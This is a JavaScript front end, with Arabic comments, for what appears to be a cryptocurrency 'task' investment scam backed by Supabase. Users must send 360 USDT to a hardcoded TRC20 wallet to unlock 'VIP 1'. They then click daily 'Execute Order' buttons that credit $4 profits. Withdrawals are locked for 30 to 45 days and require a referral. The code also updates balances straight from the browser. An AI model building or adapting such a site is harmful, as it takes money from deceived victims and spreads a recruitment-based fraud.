<script>
    const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
    const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

    let userData = {}, completedCount = 0;

    async function handleAuth() {
        const email = document.getElementById('email').value, password = document.getElementById('password').value;
        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
        if (error) alert("Login Failed"); else loadData(data.user);
    }

    async function loadData(user) {
        const { data, error } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
        if (data) { 
            userData = data;
            
            // --- منطق تجديد المهام كل 24 ساعة ---
            const lastUpdate = data.updated_at ? new Date(data.updated_at).toDateString() : "";
            const today = new Date().toDateString();

            if (lastUpdate !== today && lastUpdate !== "") {
                // إذا دخل في يوم جديد، نصفر المهام في قاعدة البيانات
                completedCount = 0;
                await _supabase.from('profiles').update({ completed_tasks: 0 }).eq('id', user.id);
            } else {
                completedCount = data.completed_tasks || 0;
            }
            // ----------------------------------

            document.getElementById('auth-screen').style.display = 'none'; 
            document.getElementById('main-app').style.display = 'block'; 
            updateUI(); 
        }
    }

    function updateUI() {
        document.getElementById('cap-bal').innerText = (userData.balance || 0).toFixed(2);
        document.getElementById('prof-bal').innerText = (userData.profit_balance || 0).toFixed(2);
        
        if (userData.is_vip) {
            const btn1 = document.getElementById('btn-vip1');
            btn1.innerText = "Activated";
            btn1.classList.add('locked');
            btn1.onclick = null;
            document.getElementById('card-vip1').style.borderColor = "#27ae60";
        }

        const container = document.getElementById('tasks-container');
        container.innerHTML = '';

        // إذا أتم المستخدم 10 مهام، نظهر له رسالة الانتهاء
        if (completedCount >= 10) {
            container.innerHTML = `
                <div style="text-align:center; padding:40px; background:white; border-radius:15px; border:2px dashed var(--primary);">
                    <div style="font-size:40px;">✅</div>
                    <h3 style="color:var(--dark);">Daily Tasks Completed</h3>
                    <p style="color:#666; font-size:13px;">Your audit limit has been reached for today. Please return after 24 hours for new nodes.</p>
                </div>`;
            return;
        }

        for(let i=1; i<=10; i++) {
            const isDone = i <= completedCount;
            container.innerHTML += `
                <div class="task-card">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span>Node #${100+i} Settlement</span>
                        <span style="color:var(--green); font-weight:bold;">+$4.00</span>
                    </div>
                    <button class="btn-submit ${isDone ? 'done' : ''}" onclick="doTask(${i-1})">
                        ${isDone ? 'Node Verified' : 'Execute Order'}
                    </button>
                </div>`;
        }
    }

    async function doTask(index) {
        if (!userData.is_vip) {
            alert("Please activate VIP 1 first.");
            return;
        }
        if (index === completedCount) {
            completedCount++;
            const newProfit = (userData.profit_balance || 0) + 4; // ربح تراكمي لا يصفر
            
            const { error } = await _supabase.from('profiles')
                .update({ 
                    completed_tasks: completedCount, 
                    profit_balance: newProfit,
                    updated_at: new Date().toISOString() // تسجيل وقت العملية
                })
                .eq('id', userData.id);

            if (!error) {
                userData.profit_balance = newProfit;
                updateUI();
            } else {
                alert("Sync Error: " + error.message);
                completedCount--;
            }
        }
    }

    function openUpgrade(amount, tier) {
        document.getElementById('modal').style.display = 'flex';
        document.getElementById('m-title').innerText = `Activate ${tier}`;
        document.getElementById('m-desc').innerText = `Transfer ${amount} USDT (TRC20) to your dedicated audit address:`;
        document.getElementById('m-extra').innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
    }

    function openModal(type) {
        if (type === 'deposit') openUpgrade(360, 'VIP 1');
        else {
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('m-title').innerText = "Withdrawal Protocol";
            document.getElementById('m-desc').innerText = "Capital Lock: 30 Days. Profits: 45 Days Audit. 1 Referral Required.";
            document.getElementById('m-extra').innerText = "Status: Locked";
        }
    }

    function closeModal() { document.getElementById('modal').style.display = 'none'; }
</script>
